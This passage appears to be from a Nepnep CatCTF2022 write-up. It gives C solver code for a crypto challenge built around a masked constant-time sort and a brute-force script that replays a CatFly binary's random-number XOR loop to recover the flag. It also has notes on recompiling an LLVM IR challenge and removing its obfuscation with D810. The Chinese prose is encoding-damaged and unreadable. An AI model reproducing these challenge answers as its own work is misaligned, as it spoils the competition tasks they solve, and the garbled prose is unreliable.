0, 0, 0, 0, 0, -1, 0, 0, 0, -1, 0, -1, -1, -1, 0, -1, 0, -1, 0, -1, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, -1, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, 0, 0, 0, -1, -1, 0, -1, 0, 0, 0, -1, 0, -1, 0, -1, -1, -1, -1, -1, 0, 0, 0, -1, -1, -1, 0, 0, 0, -1, 0, -1, 0, -1, 0, -1, -1, 0, 0, 0, 0, -1, 0, 0, -1, 0, 0, -1, -1, -1, -1, -1, 0, -1, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, -1, 0, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, -1, -1, 0, -1, 0, -1, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, -1, 0, -1, -1, 0, 0, 0, -1, 0, 0, -1, 0, 0, 0, 0, -1, 0, 0, -1, 0, -1, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, 0, -1, -1, -1, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, -1, 0, -1, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, -1, -1, -1, -1, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, -1, -1, 0, -1, 0, -1, 0, -1, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, -1, 0, 0, -1, -1, 0, 0, -1, -1, 0, 0, -1, 0, -1, 0, 0, 0, -1, -1, -1, -1, 0, 0, 0, -1, 0, 0, -1, -1, -1, 0, 0, 0, -1, -1, -1, -1, 0, 0, -1, 0, -1, 0, -1, -1, -1, 0, 0, -1, 0, -1, -1, -1, 0, 0, 0, 0, 0, 0, -1, -1, -1, -1, 0, -1, -1, -1, 0, 0, -1, 0, 0, 0, -1, 0, -1, -1, -1, 0, 0, 0, 0, -1, 0, 0, -1, 0, 0, 0, -1, -1, 0, -1, 0, 0, 0, 0, 0, -1, 0, -1, -1, 0, 0, 0, -1, -1, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, -1, 0, 0, 0, -1, -1, 0, 0, -1, -1, -1, 0, -1, -1, 0, -1, 0, 0, 0, 0, 0, -1, 0, -1, -1, -1, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, -1, -1, -1, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, -1, -1, -1, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, -1, 0, 0, -1, 0, 0, 0, 0, -1, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, -1, -1, 0, 0, 0, 0, -1, -1, 0, 0, -1, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, -1, -1, 0, -1, -1, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, -1, -1, 0, 0, -1, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, -1, -1, -1, 0, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, -1, 0, -1, 0, -1, 0, -1, 0, 0, 0, 0, -1, 0, 0, -1, 0, -1, 0, -1, 0, -1, -1, -1, 0, -1, 0, 0, -1, 0, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, -1, -1, 0, 0, 0, -1, -1, -1, -1, -1, 0, -1, -1, 0, -1, -1, -1, -1, 0, -1, -1, 0, -1, -1, -1, -1, 0, -1, -1, 0, -1, -1, -1, -1, 0, -1, -1, 0, -1, -1, -1, -1, 0, -1, -1, 0, -1, -1, 0, 0, 0, -1, -1, 0, 0, -1, 0, -1, 0, -1, -1, 0, 0, -1, 0, -1, 0, -1, -1, 0, 0, -1, -1, -1, 0, -1, -1, 0, 0, -1, -1, -1, 0, -1, -1, -1, 0, -1, -1, -1, 0, -1, 0, -1, 0, -1, -1, -1, 0, -1, 0, -1, 0, -1, 0, -1, 0, 0, -1, 0, 0, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, -1, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, -1, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, -1, -1, 0, -1, -1, -1, 0, 0, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, -1, -1, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, -1, -1, 0, 0, 0, -1, -1, 0, 0, -1, 0, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, -1, 0, -1, -1, 0, -1, -1, 0, -1, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, -1, 0, -1, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, -1, 0, 0, -1, 0, -1, 0, 0, 0, -1, 0, 0, -1, 0, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, -1, 0, -1, 0, 0, 0, -1, -1, -1, 0, 0, 0, -1, 0, -1, 0, 0, 0, -1, 0, -1, 0, -1, 0, -1, 0, -1, 0, -1, -1, 0, -1, -1, -1, -1, 0, 0, -1, -1, 0, 0, -1, -1, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, -1, -1, 0, 0, -1, -1, 0, 0, -1, -1, 0, -1, -1, -1, 0, 0, -1, -1, 0, 0, -1, -1, 0, 0, -1, -1, 0, 0, -1, -1, 0, 0, -1, -1, 0, 0, -1, -1, 0, 0, -1, -1, 0, 0, -1, -1, 0, 0, -1, 0, 0, 0, -1, -1, 0, 0, -1, -1, -1, 0, -1, -1, -1, 0, 0, 0, -1, 0, 0, 0, -1, 0, -1, 0, -1, 0, 0, 0, 0, -1, 0, 0, -1, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, -1, 0, -1, 0, 0, 0, -1, -1, 0, 0, -1, -1, -1, 0, 0, 0, -1, -1, 0, 0, -1, 0, -1, 0, 0, 0, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, -1, 0, 0, -1, -1, -1, 0, 0, 0, -1, 0, 0, 0, -1, -1, 0, 0, 0, -1, -1, -1, 0, 0, -1, -1, -1, 0, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, 0, 0, -1, 0, 0, 0, -1, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, 0, 0, -1, 0, 0, 0, -1, 0, -1, 0, 0, 0, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, -1, 0, 0, 0, -1, -1, 0, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, -1, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, -1, -1, -1, 0, 0, -1, -1, -1, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, -1, -1, -1, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, -1, -1, -1, 0, 0, -1, -1, 0, 0, -1, 0, 0, 0, 0, -1, 0, -1, -1, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, -1, -1, -1, 0, -1, 0, -1, 0, 0, -1, -1, 0, 0, -1, -1, 0, -1, -1, 0, 0, -1, -1, -1, 0, 0, 0, -1, 0, 0, -1, 0, 0, -1, -1, -1, 0, -1, -1, 0, 0, 0, 0, -1, 0, 0, 0, -1, -1, -1, 0, -1, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, -1, -1, -1, -1, 0, -1, 0, 0, -1, 0, 0, 0, 0, -1, 0, 0, -1, 0, 0, -1, 0, -1, 0, 0, -1, 0, 0, 0, 0, 0, 0, -1, 0, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, -1, 0, -1, 0, -1, -1, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, 0, -1, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, -1, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, -1, 0, -1, 0, -1, 0, -1, 0, -1, 0, -1, 0, -1, 0, -1, 0, -1, 0, -1, 0, -1, 0, -1, 0, -1, 0, -1, 0, -1, 0, -1, 0, -1, -1, -1, 0, -1, -1, -1, -1, -1, 0, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, -1, -1, -1, -1, -1, -1, -1, 0, -1, 0, -1, 0, -1, 0, -1, -1, -1, -1, -1, -1, -1, 0, -1, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, -1, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, -1, -1, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, -1, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, -1, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, 0, 0, -1, -1, 0, 0, 0, -1, -1, -1, 0, 0, -1, 0, -1, 0, 0, -1, -1, 0, 0, 0, -1, -1, -1, 0, 0, -1, -1, -1, 0, 0, -1, -1, -1, 0, 0, -1, 0, -1, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, -1, -1, -1, 0, 0, 0, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, -1, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 0, -1, -1, -1, -1, -1, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, 0, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, -1, -1, -1, 0, 0, 0, 0, -1, -1, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, -1, -1, 0, 0, 0, 0, -1, -1, -1, 0, 0, 0, 0, -1, 0, -1, 0, 0, 0, 0, -1, -1, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, -1, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, -1, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, 0, -1, 0, 0, 0, 0, -1, 0, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, -1, -1, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, -1, -1, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, -1, 0, 0, 0, -1, -1, 0, 0, 0, -1, -1, -1, 0, 0, 0, -1, -1, 0, -1, 0, 0, -1, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, -1, -1, 0, -1, 0, -1, -1, 0, 0, 0, 0, -1, -1, -1, 0, 0, -1, -1, 0, 0, 0, -1, 0, -1, 0, 0, -1, 0, 0, 0, 0, -1, 0, -1, 0, 0, -1, 0, -1, 0, 0, -1, 0, -1, 0, 0, -1, 0, -1, 0, 0, -1, -1, -1, 0, 0, 0, -1, 0, 0, 0, 0, -1, 0, 0, 0, 0, -1, -1, 0, 0, 0, 0, -1, 0, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, -1, 0, 0, -1, 0, 0, 0, -1, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0
};//from print(n) in wp.py  
/* assume 2 <= n <= 0x40000000 */
int count=0;
void great_swap(int* pa,int* pb)
{
    int ab=*pa^*pb;
    int c=n[count];
    c&=ab;
    *pa^=c;
    *pb^=c;
    count++;
}

void crypto_sort_int32(int32 *array,size_t n)
{
  size_t top,p,q,r,i,j;
  int32 *x = array;

  top = 1;
  while (top < n - top) top += top;

  for (p = top;p >= 1;p >>= 1) {
    i = 0;
    while (i + 2 * p <= n) {
      for (j = i;j < i + p;++j) {
        great_swap(&x[j],&x[j+p]);
      }
      i += 2 * p;
    }
    for (j = i;j < n - p;++j) {
      great_swap(&x[j],&x[j+p]);
    }

    i = 0;
    j = 0;
    for (q = top;q > p;q >>= 1) {
      if (j != i) {
        for (;;) {
          if (j == n - q) goto done;
          int32 a = x[j + p];
          for (r = q;r > p;r >>= 1) {
            great_swap(&a,&x[j + r]);
          }
          x[j + p] = a;
          ++j;
          if (j == i + p) {
            i += 2 * p;
            break;
          }
        }
      }
      while (i + p <= n - q) {
        for (j = i;j < i + p;++j) {
          int32 a = x[j + p];
          for (r = q;r > p;r >>= 1) {
            great_swap(&a,&x[j+r]);
          }
          x[j + p] = a;
        }
        i += 2 * p;
      }
      /* now i + p > n - q */
      j = i;
      while (j < n - q) {
        int32 a = x[j + p];
        for (r = q;r > p;r >>= 1) {
          great_swap(&a,&x[j+r]);
        }
        x[j + p] = a;
        ++j;
      }

      done: ;
    }
  }
}


int sample(int* a, int d,int N,char * ans)
{
    int i=0;
    int tmp[256];
    for(i=0;i<d+1;++i)
    {
        tmp[i]=(a[i]<<3)|1;
    }
    for(i=d+1;i<2*d+1;++i)
    {
        tmp[i]=(a[i]<<3)|2;
    }
    for(i=2*d+1;i<N;++i)
    {
        tmp[i]=(a[i]<<3);
    }
    
    crypto_sort_int32(tmp,N);
    for(i=0;i<N;++i)
    {
        ans[i]=tmp[i]&3;
    }
    return 0;
}    


char ans[256];
int init[256]=
{
};
int main(int argc, char *argv[])
{
    int N=251,q=256,p=3,d=72;
    for(int i=0;i<N;i++)
    {
        init[i]=0;
    }

    sample(init,d,N,ans);
    printf("\ncount:%d\n",count);
    for(int i=0;i<N;i++)
    {
        printf("%d,",ans[i]);
    }

    return 0;
}
```

ç„¶åæŒ‰ç¤ºä¾‹md5ã€‚

## Reverse

### CatFlyğŸ›«ğŸ±

è®¡åˆ’ä¸­æ˜¯ä¸ªéš¾åº¦ä¸­ç­‰åä¸‹çš„é€åˆ†REé¢˜ï¼Œä½†æ˜¯è§£å¤ªå°‘äº†

æ‰¾åˆ°è¾“å‡ºæ–‡å­—çš„åœ°æ–¹

![](Nepnep-CatCTF2022/2023-01-02-22-44-31_6Tbihup_fm.png)

![](Nepnep-CatCTF2022/2023-01-02-22-47-28_vaWGlJOtng.png)

æ•°æ®xoräºsub\_62B5

![](Nepnep-CatCTF2022/2023-01-02-22-48-39_Xjj97320oU.png)

dword\_E1E8 é™¤äº†å‡½æ•°æœ¬èº«ä¼šä¿®æ”¹ï¼Œè¿˜æœ‰ä¸€å¤„åœ°æ–¹ä¼šä¿®æ”¹

![](Nepnep-CatCTF2022/2023-01-02-23-05-08_8MUfX9gl9p.png)

æ ¹æ®printfè¾“å‡ºçš„å­—ç¬¦æ•°ä¿®æ”¹,æµ‹è¯•å¯å¾— 42 + log(count)

```python
#include<stdio.h>
#include<string.h>
int dword_E1E8 = 0x1106;
int dword_E120[50]={0x27fb, 0x27a4, 0x464e, 0x0e36, 0x7b70, 0x5e7a, 0x1a4a, 0x45c1, 0x2bdf, 0x23bd, 0x3a15, 0x5b83, 0x1e15, 0x5367, 0x50b8, 0x20ca, 0x41f5, 0x57d1, 0x7750, 0x2adf, 0x11f8, 0x09bb, 0x5724, 0x7374, 0x3ce6, 0x646e, 0x010c, 0x6e10, 0x64f4, 0x3263, 0x3137, 0x00b8, 0x229c, 0x7bcd, 0x73bd, 0x480c, 0x14db, 0x68b9, 0x5c8a, 0x1b61, 0x6c59, 0x5707, 0x09e6, 0x1fb9, 0x2ad3, 0x76d4, 0x3113, 0x7c7e, 0x11e0, 0x6c70};
int sub_62B5()
{
  dword_E1E8 = 1103515245 * dword_E1E8 + 12345;
  return (dword_E1E8 >> 10) & 0x7FFF;
}

int llog(int n){
    int a = 0;
    while(n /= 10)a++;
    return a;
}

int sub_62E3(char a1)
{
  int result; // rax

  if ( (a1 & 0x7Fu) <= 0x7E )
    result = (a1 & 0x7Fu) > 0x20;
  else
    result = 0LL;
  return result;
}

int main(){
    int count = 0;
    while(1){
        for(int i = 0; i < 50; i++){
            dword_E120[i]^=sub_62B5();
        }
        count++;
        dword_E1E8+=42+llog(count);
        if(count % 1000000 == 0 ){
            printf("Count:%d\n",count);
        }
        unsigned char flag[51]={0};
        for(int i = 0; i < 50; i++){
            // Loop: 100427942
            // if((dword_E120[i] & 0xff00)){
            //     break;
            // }
            // Loop: 100001958
            if(!sub_62E3(dword_E120[i])){
                break;
            }
            flag[i]=dword_E120[i]&0xff;
        }
        if(memcmp("CatCTF",flag,6) == 0){
            puts(flag);
            printf("Count:%d\n",count);
            break;
        }
    }
}

```

![](Nepnep-CatCTF2022/2023-01-02-23-40-31_UlFTSbFYUW.png)

PS: å‡ºé¢˜æ—¶å¾ªç¯æ¬¡æ•°ä¸º705980581ï¼Œä½†æ˜¯çº¿æ€§åŒä½™éšæœºæ•°ç®—æ³•å‡ºç°äº†å¾ªç¯å¯¼è‡´åœ¨100427942å°±å‡ºç°äº†flagï¼Œè‹¥åªè€ƒè™‘æ•°ç»„çš„æœ€ä½å­—èŠ‚ï¼Œèƒ½åœ¨100001958å¾—åˆ°flag

é™„ï¼šnyancatå¼€æº [https://github.com/klange/nyancat](https://github.com/klange/nyancat "https://github.com/klange/nyancat")

### ReadingSection

å…¶å®æœ€æ—©çš„é¢„æœŸè§£æ˜¯ç¡¬è¯»LLVM IR .txtï¼Œå› ä¸ºæ•…æ„ç®—æ³•è®¾è®¡çš„å¾ˆç®€å•ï¼Œä¹Ÿä¸æ˜¯å¾ˆé•¿ï¼Œç†Ÿæ‚‰LLVM IRçš„é€‰æ‰‹å¤§æ¦‚ä¸€ä¸ªå¤šå°æ—¶å¯ä»¥åšå‡ºæ¥ã€‚åé¢å‘ç°æ­¤é¢˜å¯ä»¥æœ‰æ›´ç®€ä¾¿çš„æ–¹æ³•ã€‚

ä½¿ç”¨llvm-aså¯ä»¥ååºåˆ—åŒ–IRåˆ°.bcæ–‡ä»¶

```python
PS D:\2022CTF\Myself\ReadingSection> llvm-as .\1.txt -o 1.bc
D:\LLVM\Windows\bin\llvm-as.exe: .\1.txt:9:62: error: constant expression type mismatch: got type '[18 x i8]' but expected '[33 x i8]'
@__const.main.flag = private unnamed_addr constant [33 x i8] c"CAT Hide Your Flag", align 16
```

ä¼šæœ‰ä¸€ä¸ªæŠ¥é”™ï¼Œè¿™ä¸ªæ•°ç»„æœ¬æ¥æ˜¯å­˜çš„flagï¼Œè¢«æˆ‘æ”¹æ‰äº†å¯¼è‡´é•¿åº¦å®šä¹‰ä¸å£°æ˜ä¸åŒ¹é…ã€‚éšä¾¿å°†å…¶æ•°ç»„å†…å®¹æ”¹ä¸º33é•¿åº¦å³å¯ã€‚ç„¶ållvm-aså¯ä»¥æˆåŠŸç¼–è¯‘ä¸ºbcæ–‡ä»¶ã€‚è€Œåç”¨ *clang -c*å°†bcç¼–è¯‘ä¸º.oå¯¹è±¡

```python
PS D:\2022CTF\Myself\ReadingSection> llvm-as .\1.txt -o 1.bc
PS D:\2022CTF\Myself\ReadingSection> clang -c 1.bc
```

ç¼–è¯‘æˆ.oå¯¹è±¡åï¼Œå°±å¯ä»¥ç”¨IDAæ‰“å¼€äº†ï¼Œæ‰“å¼€åä¼šå‘ç°checkå‡½æ•°æ˜¯è¢«åŠ äº†éæ ‡å‡†å¹³å¦åŒ–çš„ã€‚

![](Nepnep-CatCTF2022/1_fXbaW2IWQm.jpg)

ç„¶åè¿™å°±åˆè¦ç”¨åˆ°å»æ··æ·†ç¥å™¨D810äº†ã€‚æŠŠD810æ’ä»¶æ‰“å¼€ï¼Œé€‰ç”¨é»˜è®¤è§„åˆ™ï¼Œå†F5ï¼Œæ··æ·†åŸºæœ¬è¢«å»å¹²å‡€äº†

![](Nepnep-CatCTF2022/2_5-u8qJkX7a.jpg)

å¯ä»¥çœ‹åˆ°å°±æ˜¯ä¸€ä¸ªå¼‚æˆ–+TEA

```c
#include <cstdio>
#include <stdlib.h>
#include <windows.h>

union data{
    BYTE raw[32];
    DWORD data[8];
};

BYTE ciphers[] = {
